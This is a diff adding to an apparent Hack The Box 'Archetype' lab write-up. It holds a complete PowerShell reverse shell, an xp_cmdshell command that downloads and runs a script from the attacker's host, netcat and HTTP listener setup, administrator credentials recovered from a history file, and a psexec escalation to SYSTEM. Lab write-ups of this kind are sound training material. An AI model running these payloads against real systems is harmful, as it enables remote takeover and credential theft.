@@ -308,17 +308,136 @@ NULL
 
 ### 4. Get shell (Nomal user)
 Then, try to get shell using the code below the same as [writeup](file:///C:/Users/ttakaki/Downloads/Archetype.pdf "writeup").
+Don't forget to rewrite 10.10.14.152 to your ip address.
+You can get your ip address to use ```ip a``` or ```host -I``` command.
 
 ```
-$client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);
+$client = New-Object System.Net.Sockets.TCPClient("10.10.14.152",443);
 $stream = $client.GetStream();
 [byte[]]$bytes = 0..65535|%{0};
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
-    $data = (New-Object -TypeNameSystem.Text.ASCIIEncoding).GetString($bytes,0, $i);
-    $sendback = (iex $data 2>&1 | Out-String );
-    $sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+$sendback = (iex $data 2>&1 | Out-String );
+$sendback2 = $sendback + "#";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+$stream.Write($sendbyte,0,$sendbyte.Length);
+$stream.Flush()};$client.Close()
 ```
 
 The [ref0](https://stackoverflow.com/questions/47193282/what-does-bytebytes-0-655350-mean-in-powershell "ref0"), [ref1](https://qiita.com/LazarusMakoto/items/631af8aba4079f82c7c3 "ref1"), [ref2](https://www.vwnet.jp/Windows/PowerShell/Ope/OpeListg.htm "ref2"), [ref3](https://qiita.com/minr/items/b4f71dad4438707d84d3 "ref3"), [ref4](https://win.just4fun.biz/?PowerShell/%E6%96%87%E5%AD%97%E5%88%97%E3%82%92%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E3%81%A8%E3%81%97%E3%81%A6%E5%AE%9F%E8%A1%8C%E3%81%99%E3%82%8B%E3%83%BBInvoke-Expression "ref4") may help you to understand what the code means.
 To put it simply, this code sends a command, displays the returned string, and accepts the command again.
 
+To built a listening server from the attack target, we have to reconfigure our FW rules.
+So, allow port 80, 443 from 10.10.10.27, use the command below at your host's terminal, the same location where we made shell.ps1.
+Then built a listening server.
+
+```
+$ sudo apt install -y ufw
+$ sudo ufw allow from 10.10.10.27 proto tcp to any port 80,443
+$ sudo python3 -m http.server 80
+$ sudo nc -lvnp 443
+```
+
+Issue the command below to execute powershell at SQL server which we made.
+Don't forget to rewrite 10.10.14.152 to your ip address.
+
+```
+SQL> xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.152/shell.ps1\");"
+```
+
+Then, on nc command screen, we can issue any windwos command so put return to it.
+And we can fine ```C:\Users\sql_svc\Desktop\user.txt``` which is includeing flag of user own.
+
+```
+listening on [any] 443 ...
+connect to [10.10.14.152] from (UNKNOWN) [10.10.10.27] 49673
+ls
+
+
+    Directory: C:\Windows\system32
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        9/15/2018   2:06 AM                0409                                                                  
+d-----        1/19/2020   3:09 PM                1033                                                                  
+d-----        9/15/2018  12:12 AM                AdvancedInstallers                                                    
+
+............
+
+-a----        9/15/2018  12:09 AM         478208 wuuhext.dll                                                           
+-a----        9/15/2018  12:09 AM         179712 wuuhosdeployment.dll                                                  
+-a----        9/15/2018  12:09 AM          47616 xcopy.exe                                                             
+-a----        9/15/2018  12:09 AM          68096 xmlfilter.dll                                                         
+-a----        9/15/2018  12:09 AM         231368 xmllite.dll                                                           
+-a----        9/15/2018  12:09 AM          64000 xolehlp.dll     
+
+#cd C:\Users\sql_svc\Desktop
+#cat sql_svc/Desktop/user.txt
+3eXXXXXXXXXXXXXXXXXXXXXXXXXX21a3
+
+```
+
+### 5. Elavation of privilege
+
+```
+#type C:\Users\sql_svc\AppData\Roaming\Microsoft\windows\PowerShell\PSReadline\ConsoleHost_history.txt
+net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+exit
+```
+
+
+```
+python3 psexec.py administrator@10.10.10.27
+Impacket v0.9.24.dev1+20210618.54810.11f43043 - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Requesting shares on 10.10.10.27.....
+[*] Found writable share ADMIN$
+[*] Uploading file HOiTlZnU.exe
+[*] Opening SVCManager on 10.10.10.27.....
+[*] Creating service YUQr on 10.10.10.27.....
+[*] Starting service YUQr.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>ls
+b"'ls' is not recognized as an internal or external command,\r\noperable program or batch file.\r\n"
+C:\Windows\system32>dir
+ Volume in drive C has no label.
+ Volume Serial Number is CE13-2325
+
+ Directory of C:\Windows\system32
+
+01/19/2020  04:10 PM    <DIR>          .
+01/19/2020  04:10 PM    <DIR>          ..
+09/15/2018  02:06 AM    <DIR>          0409
+01/19/2020  04:09 PM    <DIR>          1033
+09/15/2018  12:09 AM             2,151 12520437.cpx
+09/15/2018  12:09 AM             2,233 12520850.cpx
+
+.................
+
+C:\Windows\system32>cd C:\Users
+
+C:\Users>cd administrator/Desktop
+
+C:\Users\Administrator\Desktop>dir
+ Volume in drive C has no label.
+ Volume Serial Number is CE13-2325
+
+ Directory of C:\Users\Administrator\Desktop
+
+01/20/2020  06:42 AM    <DIR>          .
+01/20/2020  06:42 AM    <DIR>          ..
+02/25/2020  07:36 AM                32 root.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  33,833,037,824 bytes free
+
+C:\Users\Administrator\Desktop>cat root.txt
+b"'cat' is not recognized as an internal or external command,\r\noperable program or batch file.\r\n"
+C:\Users\Administrator\Desktop>type root.txt
+b91XXXXXXXXXXXXXXXXXXXXXXXXXXX28
+
+
+```
